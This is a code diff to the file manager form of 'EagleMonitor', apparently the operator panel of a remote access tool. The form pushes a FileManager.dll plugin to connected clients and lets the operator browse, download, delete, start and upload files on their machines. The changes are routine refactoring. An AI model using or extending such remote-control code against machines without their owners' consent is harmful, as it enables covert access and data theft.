@@ -4,11 +4,11 @@ using EagleMonitor.Controls;
 using PacketLib;
 using PacketLib.Packet;
 using System;
-using System.Collections.Generic;
 using System.IO;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Drawing;
+using System.Collections.Generic;
 
 /* 
 || AUTHOR Arsium ||
@@ -19,22 +19,25 @@ namespace EagleMonitor.Forms
 {
     public partial class FileManagerForm : FormPattern
     {
+        internal static Dictionary<string, DownloadFileForm> downloadForms;
+        static FileManagerForm()
+        {
+            downloadForms = new Dictionary<string, DownloadFileForm>();
+        }
+
         private ClientHandler clientHandler { get; set; }
-        public Dictionary<string, DownloadFileForm> files;
+
         internal FileManagerForm(ClientHandler clientHandler)
         {
             this.clientHandler = clientHandler;
-            this.files = new Dictionary<string,DownloadFileForm>(); 
             InitializeComponent();
         }
 
         private void FileManagerForm_Load(object sender, EventArgs e)
         {
             Miscellaneous.Enable(this.fileListView);
-            //new Guna.UI2.WinForms.Helpers.ListViewScrollHelper(fileListView, guna2VScrollBar1, true);
             DiskPacket diskPacket = new DiskPacket();
             diskPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1);
-
             this.clientHandler.SendPacket(diskPacket);
         }
 
@@ -92,46 +95,51 @@ namespace EagleMonitor.Forms
 
         private void fileListView_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            Task.Run(() =>
+            if (fileListView.SelectedItems[0].Tag.ToString() == "FOLDER" && fileListView.SelectedItems.Count == 1)
             {
-                if (fileListView.SelectedItems[0].Tag.ToString() == "FOLDER" && fileListView.SelectedItems.Count == 1)
+                this.loadingCircle1.Visible = true;
+                this.loadingCircle1.Active = true;
+                string NewPath = labelPath.Text + fileListView.SelectedItems[0].Text + "\\";
+                this.labelPath.Text = NewPath;
+                FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                 {
-                    this.loadingCircle1.Visible = true;
-                    this.loadingCircle1.Active = true;
-                    string NewPath = labelPath.Text + fileListView.SelectedItems[0].Text + "\\";
-                    this.labelPath.Text = NewPath;
-                    FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
-                    {
-                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
-                    };
-                    clientHandler.SendPacket(fileManagerPacket);
-                }
-                else if (fileListView.SelectedItems[0].Tag.ToString() == "FILE" && fileListView.SelectedItems.Count == 1)
-                {
-                    string fileToStart = labelPath.Text + fileListView.SelectedItems[0].Text;
+                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
+                };
+                clientHandler.SendPacket(fileManagerPacket);
+            }
+            else if (fileListView.SelectedItems[0].Tag.ToString() != "FOLDER" && fileListView.SelectedItems.Count == 1)
+            {
+                string fileToStart = labelPath.Text + fileListView.SelectedItems[0].Text;
 
-                    StartFilePacket startFilePacket = new StartFilePacket(fileToStart)
-                    {
-                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
-                    };
-                    clientHandler.SendPacket(startFilePacket);
-                }
-            });
+                StartFilePacket startFilePacket = new StartFilePacket(fileToStart)
+                {
+                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
+                };
+                clientHandler.SendPacket(startFilePacket);
+            }
         }
 
         private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            //TODO : ProgressBar ?
             foreach (ListViewItem selected in fileListView.SelectedItems)
             {
-                if (selected.Tag.ToString() == "FILE")
+                if (selected.Tag.ToString() != "FOLDER")
                 {
                     string fileToDownload = labelPath.Text + selected.Text;
 
-                    DownloadFileForm downloadFileForm = new DownloadFileForm(fileToDownload, this.clientHandler.IP)
+                    DownloadFileForm downloadFileForm = new DownloadFileForm(fileToDownload, this.clientHandler.IP, long.Parse(selected.Tag.ToString()))
                     {
                         Text = fileToDownload
                     };
+
+                    if (File.Exists(this.clientHandler.clientPath + "\\Downloaded Files\\" + selected.Text))
+                    {
+                        DialogResult redownload = MessageBox.Show(this,"You've already downloaded this file. Do you want to re-download it again (old will be deleted) ?", "Eagle Monitor", MessageBoxButtons.YesNo);
+                        if (redownload == DialogResult.No)
+                            return;
+                        else
+                            File.Delete(this.clientHandler.clientPath + "\\Downloaded Files\\" + selected.Text);
+                    }
 
                     downloadFileForm.label1.Text = Miscellaneous.SplitPath(fileToDownload);
                     downloadFileForm.Show();
@@ -143,7 +151,7 @@ namespace EagleMonitor.Forms
         {
             foreach (ListViewItem selected in fileListView.SelectedItems)
             {
-                if (selected.Tag.ToString() == "FILE")
+                if (selected.Tag.ToString() != "FOLDER")
                 {
                     string fileToDelete = labelPath.Text + selected.Text;
 
@@ -160,7 +168,7 @@ namespace EagleMonitor.Forms
         {
             foreach (ListViewItem selected in fileListView.SelectedItems)
             {
-                if (selected.Tag.ToString() == "FILE")
+                if (selected.Tag.ToString() != "FOLDER")
                 {
                     string fileToStart = labelPath.Text + selected.Text;
 
@@ -177,7 +185,7 @@ namespace EagleMonitor.Forms
         {
             foreach (ListViewItem selected in fileListView.SelectedItems)
             {
-                if (selected.Tag.ToString() == "FILE")
+                if (selected.Tag.ToString() != "FOLDER")
                 {
                     string fileToRename = labelPath.Text + selected.Text;
 
@@ -213,7 +221,7 @@ namespace EagleMonitor.Forms
         }
         private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (fileListView.SelectedItems.Count == 0 || fileListView.SelectedItems[0].Tag.ToString() == "FILE")
+            if (fileListView.SelectedItems.Count == 0 || fileListView.SelectedItems[0].Tag.ToString() != "FOLDER")
             {
                 using (OpenFileDialog ofd = new OpenFileDialog())
                 {
